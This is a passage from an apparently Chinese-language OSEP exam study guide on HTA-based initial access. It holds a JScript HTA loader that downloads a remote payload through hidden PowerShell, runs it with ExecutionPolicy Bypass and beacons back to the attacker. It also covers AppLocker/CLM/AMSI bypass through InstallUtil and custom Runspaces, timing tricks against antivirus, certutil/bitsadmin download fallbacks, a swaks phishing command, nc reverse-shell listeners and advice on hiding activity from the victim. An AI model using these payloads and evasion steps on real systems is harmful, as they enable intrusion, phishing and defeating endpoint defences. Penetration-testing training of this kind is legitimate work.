    var dl = "powershell.exe -nop -w hidden -Command " +
             "\"(New-Object Net.WebClient).DownloadFile('" + URL + "','" + OUT + "')\"";
    var rc1 = sh.Run(dl, 0, true);

    // 给实时扫描/杀软放行留时间窗：文件刚写完可能正被扫描，立刻执行易失败
    WScript.Sleep(3000);

    if (rc1 !== 0) {
        beacon("/cb?stage=download-fail&rc=" + rc1);
    } else if (!fileExists(OUT)) {
        beacon("/cb?stage=download-fail&reason=no-file");
    } else {
        beacon("/cb?stage=download-done&size=" + fileSize(OUT));
        // ---- 阶段二：文件确认存在后，单独执行 ----
        // 按落盘文件类型选择执行方式：
        //  .ps1 -> powershell -File（需无 CLM/脚本规则限制；受限时改走 InstallUtil/Runspace）
        //  .exe -> 直接 Run 或 InstallUtil.exe /U（AppLocker 场景，见 m02-hta-embedded-clm-bypass.hta）
        var ex = "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File " + "\"" + OUT + "\"";
        var rc2 = sh.Run(ex, 0, true);
        if (rc2 !== 0) { beacon("/cb?stage=exec-fail&rc=" + rc2); }
        else           { beacon("/cb?stage=exec-done"); }
    }
    // 日志结论对照：download-fail = 下载环节问题（引号/代理/URL）；
    //               download-done + exec-fail = 执行方式受限，切场景 7 组合链；
    //               两阶段都 done 却无回连 = shell.ps1 内容/监听问题（AMSI 见场景 7）。
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

**验证**：链路分 4~5 个 HTTP 回显点（`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / 最终 nc 回连）。考试时按回显停在哪个点来定位：停在编译前=写文件或 csc 被拦；停在 InstallUtil 后无回连=runner 位数不对或 shell.ps1 被 AMSI/杀软拦。最后 `whoami` + `ipconfig /all` 确认身份与网段。

**失败分支与备选**：
- 若 x64 runner 无回连而 x86 有（或反之）→ 位数不匹配，换另一份编译产物；确认 mshta/InstallUtil 实际位数（Framework64 是 64 位程序）。
- 若 InstallUtil 本身被 AppLocker 或策略移除 → DotNetToJScript 变体（不经 InstallUtil、不经 EXE）。
- 若 AMSI 处理那行被拦（`AmsiUtils` 字符串本身是特征）→ 换 `Disable AMSI` 一节的其他反射写法或拆串拼接，并保持与宿主进程位数一致。
- 若整条链在真实目标上"分开的环节各自单独验证都过、串起来没反应" → 按场景 8 排时序，不预设是杀软。

**考试注意 / OPSEC**：三件套组合链**必须在实验网完整走一遍**再上考场——顺序、位数、引用缺失、InstallUtil 路径任何一个没验过都是时间黑洞；runner 与 shell.ps1 用 x64/x86 双份并按目标实测；避免 Meterpreter 大载荷，简单 TCP 回连 + AMSI 处理最稳（cheat sheet 注明 AMSI 开启时部分样本不工作）；HTA 会短暂闪窗，用 minimize + 立即 `self.close()`。

---

## 场景 8：HTA 下载和执行放在一起失败，分开后能够工作

**场景回顾**：目标确实打开了 HTA、也访问了下载地址，但最终没有执行结果——"分开可以、放一起没反应"。按**时序与生命周期**场景处理，不预先认定失败由杀软造成。

**前提与假设**：HTA 能触发（场景 6/7 的回调已验证）；下载地址确实被访问过（web 日志有 GET）；"合在一起的单条命令"里同时含下载与执行两件事。可能成因分类：A) 单条命令行里的引号/转义在 cmd 层被吃掉（最常见：外层 `Run("...")` 双引号 + 内层 PowerShell 引号 + `&` `|` `;` 在 HTML 属性里被当实体解析）；B) 第一个进程写文件未落盘/未写完，第二个进程已开始读；C) mshta 主窗口 `self.close()` 提前退出，宿主对子进程的生命周期管理（job/window station）把长任务带走；D) 命令过长或整体文本触发 AMSI/杀软静态扫描，而拆短后不触发；E) 新写文件正被实时扫描，紧跟着的进程打不开（时间竞争）。

**准备（攻击机侧）**：静态服务器上放 3 个文件：`m02-hta-download-exec-split.hta`、下载源（`shell.ps1` 或 `stage2.ps1`）、`ok.txt` 探针。监听 `nc -lvnp LPORT`。**另外开一个终端持续 `tail -f` web 访问日志**——本场景的所有结论都来自日志顺序，不是猜。

**执行步骤**：
1. 先收集证据，回答四个问题（web 日志逐条核对）：
   1. `GET /xxx.hta` 有吗？没有 → 是投递/触发问题，不是执行链问题；
   2. HTA 首行回显（`/cb?stage=hta-start`）有吗？没有 → mshta 里 JScript 没跑起来；
   3. `GET /shell.ps1`（下载动作）有吗？没有 → 第一阶段命令没执行到下载那一步；
   4. 回连有吗？没有但 1-3 全有 → 问题在"下载后到执行之间"，即 A/B/C/E 类时序或生命周期。
2. 用 `m02-hta-download-exec-split.hta` 跑"分离两阶段"：
   - 阶段一：`WScript.Shell.Run(下载命令, 0, true)`——`true` 表示**等该进程结束才返回**；下载成功后 JScript 用 `Scripting.FileSystemObject` 检查文件存在，再回显 `GET /cb?stage=download-done`；
   - 阶段二：文件确认存在后再 `Run(执行命令, 0, true)`，执行完回显 `GET /cb?stage=exec-done`。
   - 中间可加 2~5 秒 `WScript.Sleep`，给实时扫描/杀软放行留时间窗（B/E 类成因的对策）。
3. 对照日志判断落在哪一类，然后对症：
   - 阶段一回显失败 → 下载命令本身的引号/代理问题（回到场景 6 备选：换 `certutil`/`bitsadmin` 下载，或给 PowerShell 显式代理）；
   - 阶段一成功、阶段二失败 → 执行方式被限制（CLM/AppLocker/杀软执行路径），把执行端换成场景 7 的 runner 触发（InstallUtil /U 或自定义 Runspace IEX）；
   - 两阶段单独都成功，但合成一条命令就失败 → 就是 A 类转义/解析问题或 C 类生命周期：**不再尝试单行**，坚持两阶段；若必须单文件，把两个 `Run` 用 `&&`/`;` 放在**同一条 cmd 串**里并给每条加 `start /wait` 语义，同时避免任何引号嵌套（把 PowerShell 代码先 `-enc` base64，命令里只剩一层引号）。
4. "带完成确认的单文件版本"（题目要求可提前准备）：同一 .hta 内按顺序放两个 `Run(..., 0, true)`，不要依赖 `self.close()` 后子进程继续存活；关键操作前回显进度点。验证时对照 web 日志确认回显顺序 = 代码顺序。
5. 只有当"日志显示每个环节都成功、分离状态也成功、仅合并不行"时，才把杀软/AMSI 列为候选，并按场景 7 的 AMSI 处理与更短命令重试。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/hta/m02-hta-download-exec-split.hta` | 下载与执行分离两阶段 + 文件存在性检查 + 进度回显 | 替换 `LHOST`、`OUT` |
| `scripts/hta/m02-hta-callback.hta` | 确认 HTA 触发与出网（排错第一步） | 替换 `LHOST` |
| `scripts/hta/m02-hta-powershell-stager.hta` | 对照用：一步式 IEX（演示"合在一起"形态） | 替换 `LHOST` |

**验证**：web 日志出现有序回显 `hta-start → download-done → exec-done`，`nc` 拿到回连。把"失败形态"与"分离形态"的日志并排对比，能直接指认断点环节；能稳定复现分离成功 = 问题定位完成。

**失败分支与备选**：
- 若下载走 PowerShell 被拦但浏览器/mshta 出网正常 → 下载器换成 `certutil -urlcache -split -f URL OUT` 或 `bitsadmin /transfer`（M10 的下载备选矩阵通用）。
- 若执行端是 CLM 导致 `-File shell.ps1` 无效 → 执行端换 InstallUtil/自定义 Runspace（场景 7 链路），下载端保持分离。
- 若怀疑扫描时间竞争 → 两阶段之间加固定 `WScript.Sleep(2000~5000)` 或轮询文件可读后再执行。
- 若目标机 mshta 一 `self.close()` 子进程就被带走 → 让执行命令通过 `schtasks` 或 `wmic process call create` 脱离宿主进程树（生命周期解法，注意是否落在 AppLocker 白名单内）。

**考试注意 / OPSEC**：本场景最大坑是"没看日志就换杀软绕过"，白白浪费时间——**先回显、再下结论**；分离两阶段的回显点本身就是考试里可展示的排错证据；单文件合成版若必须给用户，确保窗口 minimize + 立即关闭，避免"下载完窗口还挂着"被用户注意到；对目标写文件优先 `C:\Windows\Tasks` 或 `%TEMP%`，避免触发受保护目录写入告警。

---

## 模块速查表

```bash
# ---- 攻击机侧 ----
cd ~/osep/payloads/web && python3 -m http.server 80
nc -lvnp LPORT
# 邮件诱导（链接形式优先）：
swaks --body 'Please click here http://LHOST/stager.hta' \
  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
  --header "Subject: issue" -t TARGET -f USER@example.com --server SMTP_SERVER

# ---- 编译 runner（Windows 编译机，x64/x86 各一份）----
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo \
  /out:m02stage64.exe /r:System.Management.Automation.dll \
  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo \
  /out:m02stage32.exe /r:System.Management.Automation.dll \
  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
# exe 转文本过下载链（可选）：
certutil -encode m02stage64.exe enc.txt

# ---- 目标侧触发 ----
mshta.exe http://LHOST/m02-hta-callback.hta            # 1) 确认触发
mshta.exe http://LHOST/m02-hta-powershell-stager.hta   # 2) 无 CLM 时直接 IEX
mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta # 3) AppLocker+CLM+AMSI 全开
mshta.exe http://LHOST/m02-hta-download-exec-split.hta # 4) 时序问题排错

# ---- 判断是否切组合链（会话内）----
$ExecutionContext.SessionState.LanguageMode            # ConstrainedLanguage = CLM
Get-AppLockerPolicy -Effective                          # 有效规则
Get-Process -Name powershell | % { $_.Modules | ? ModuleName -eq 'amsi.dll' }

# ---- 备选触发（不经 mshta）----
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false /U C:\Windows\Tasks\m02stage64.exe
```

## 关联脚本清单

- `scripts/hta/m02-hta-callback.hta` —— 最小 HTA 回调（场景 6/7/8 共用第一步）
- `scripts/hta/m02-hta-powershell-stager.hta` —— HTA→PowerShell IEX 拉第二阶段（场景 6；场景 8 的"合并形态"对照）
- `scripts/hta/m02-hta-download-exec-split.hta` —— 下载/执行分离两阶段 + 文件检查 + 进度回显（场景 8）
- `scripts/hta/m02-hta-embedded-clm-bypass.hta` —— 内嵌 C# 现编现跑 + InstallUtil /U + 自定义 Runspace（场景 7，单文件）
- `scripts/csharp/m02-clm-bypass-runspace.cs` —— InstallUtil 兼容 runner：自定义 Runspace + AMSI 处理 + IEX（场景 6/7）
- `scripts/csharp/m02-clm-bypass-dotnettojscript.cs` —— DotNetToJScript 载荷类，无 EXE/无 InstallUtil 备选（场景 7）
